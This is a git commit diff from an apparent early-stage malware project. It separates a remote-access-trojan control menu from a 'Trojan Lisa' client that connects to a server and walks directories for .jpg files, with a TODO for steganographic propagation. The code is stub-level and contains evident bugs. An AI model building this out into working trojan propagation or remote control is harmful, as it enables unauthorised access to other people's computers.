e4794a60da927cbd624401d172fd7396243ec88b
Mason Moreland <mazc@protonmail.ch>
2020-07-27 23:27:39 -0700

    Split RAT interface and steganographic malware into two files

---
+++ src/le_louvre.py
@@ -0,0 +1,38 @@
+import server
+
+class LeLouvre:
+    def __init__(self):
+        self.commands = {
+            0: "Exit from RAT interface",
+            1: "Run Server",
+            2: "Set Mona Lisa as desktop background"
+        }
+        self.server = server.Server()
+
+    def run_rat_interface(self):
+        while True:
+            print("Le Louvre RAT Interface")
+            for command, description in self.commands:
+                print(command, "->", description)
+            
+            command_key = input()
+            # Invalid input
+            if command_key not in self.commands:
+                continue
+            # Exit program
+            elif command_key == 0:
+                return
+            else:
+                self.execute_command(command_key)
+
+    def execute_command(self, command_key):
+        # Establish server for client connection
+        if command_key == 1:
+            self.server.host()
+        # TODO: Set background to Mona Lisa
+        elif command_key == 2:
+            pass
+            
+if __name__=="__main__":
+    le_louvre = LeLouvre()
+    le_louvre.run_rat_interface()
--- src/trojan_lisa.py
+++ src/trojan_lisa.py
@@ -1,39 +1,22 @@
+import os
 import client
-import server
 
 class TrojanLisa:
     def __init__(self):
-        self.commands = {
-            0: "Exit from RAT interface",
-            1: "Run Server",
-            2: "Set Mona Lisa as desktop background"
-        }
-        self.server = Server()
+        self.client = client.Client()
 
-    def run_rat_interface(self):
-        while True:
-            print("Le Louvre RAT Interface")
-            for command, description in self.commands:
-                print(command, "->", description)
-            
-            command_key = input()
-            # Invalid input
-            if command_key not in self.commands:
-                continue
-            # Exit program
-            elif command_key == 0:
-                return
-            else:
-                self.execute_command(command_key)
+    # TODO: Steganographic executable propagation into other images
+    def propagate(self):
+        rootdir = "." + os.sep
+        for subdir, dirs, files in os.walk(rootdir):
+            for file in files:
+                filepath = subdir + os.sep + file
 
-    def execute_command(self, command_key):
-        # Establish server for client connection
-        if command_key == 1:
-            self.server.host()
-        # TODO: Set background to Mona Lisa
-        elif command_key == 2:
-            pass
+                if filepath.endswith(".jpg"):
+                    print(filepath)
+
+    def connect_to_server(self):
+        self.client.connect()
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    trojan_lisa.run_rat_interface()
